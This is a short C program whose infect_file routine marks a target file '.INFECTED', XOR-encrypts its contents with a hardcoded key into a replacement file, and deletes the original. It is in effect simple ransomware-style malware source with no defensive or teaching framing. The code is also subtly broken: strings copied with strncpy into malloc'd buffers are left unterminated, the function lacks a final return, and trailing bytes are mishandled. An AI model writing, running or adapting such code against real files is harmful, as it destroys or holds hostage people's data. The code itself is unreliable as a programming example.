#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

const char * const str_infected =".INFECTED";
const char * const str_version = "V1.0";

const unsigned int key = 0x12345678;

bool infect_file(char * file_path);

int main(int argc, char * argv[])
{
	if(argc == 2)
		infect_file(argv[1]);
	
	return EXIT_SUCCESS;
}

bool infect_file(char * src_file_path)
{
	FILE * fp_src = NULL;
	FILE * fp_dest = NULL;
	char * src_file_name = NULL;
	char * dest_file_name = NULL;
	unsigned int value = 0;
	long file_size = 0;
	char buf[100] = {0};
	
	/*
	 * Has the file been infected?
	 * If it has been infected, don't infect it again.
	 */
	if((fp_src = fopen(src_file_path, "r")) == NULL)
		return false;
	
	if(fread(buf, 1, strlen(str_infected) + 1, fp_src) != strlen(str_infected) + 1)
		return false;
	
	if(strncmp(buf, str_infected, strlen(str_infected)) == 0)
		return false;
	
	if(fclose(fp_src) != 0)
		return false;
	
	src_file_name = malloc(strlen(src_file_path) + strlen(str_infected) + 1);
	strncpy(src_file_name, src_file_path, strlen(src_file_path));
	strncat(src_file_name, str_infected, strlen(str_infected));
	
	dest_file_name = malloc(strlen(src_file_path) + 1);
	strncpy(dest_file_name, src_file_path, strlen(src_file_path));
	
	/*
	 * If we have control power?
	 * If not, don't do anything.
	 */
	if(rename(src_file_path, src_file_name) != 0)
		return false;
		
	/*
	 * Start infecting.
	 */
	
	if((fp_src = fopen(src_file_name, "r")) == NULL)
		return false;
	
	if((fp_dest = fopen(dest_file_name, "w+")) == NULL)
		return false;
	
	/*
	 * Write infected flag.
	 */
	if((fwrite(str_infected, 1, strlen(str_infected) + 1, fp_dest)) != strlen(str_infected) + 1)
		return false;
	if(fseek(fp_dest, 0x10, SEEK_SET) != 0)
		return false;
	
	/*
	 * Write infected version.
	 */
	if((fwrite(str_version, 1, strlen(str_version) + 1, fp_dest)) != strlen(str_version) + 1)
		return false;
	if(fseek(fp_dest, 0x20, SEEK_SET) != 0)
		return false;
	
	/*
	 * Write original file size.
	 */
	if(fseek(fp_src, 0, SEEK_END) != 0)
		return false;
	file_size = ftell(fp_src);
	if(fseek(fp_src, 0, SEEK_SET) != 0)
		return false;
	if((fwrite(&file_size, sizeof(long), 1, fp_dest)) != 1)
		return false;
	if(fseek(fp_dest, 0x30, SEEK_SET) != 0)
		return false;
	
	
	while((fread(&value, sizeof(unsigned int), 1, fp_src)) == 1)
	{
		value ^= key;
		if((fwrite(&value, sizeof(unsigned int), 1, fp_dest)) != 1)
			return false;
		value = 0;
	}
	if(ferror(fp_src))
		return false;
	else if(feof(fp_src))
		fflush(fp_dest);
	else
	{
		if((fwrite(&value, sizeof(unsigned int), 1, fp_dest)) != 1)
			return false;
		fflush(fp_dest);
	}
	
	if(fclose(fp_src) != 0)
		return false;
	
	if(fclose(fp_dest) != 0)
		return false;
	
	/*
	 * Delete original file.
	 */
	if(remove(src_file_name) != 0)
		return false;
}
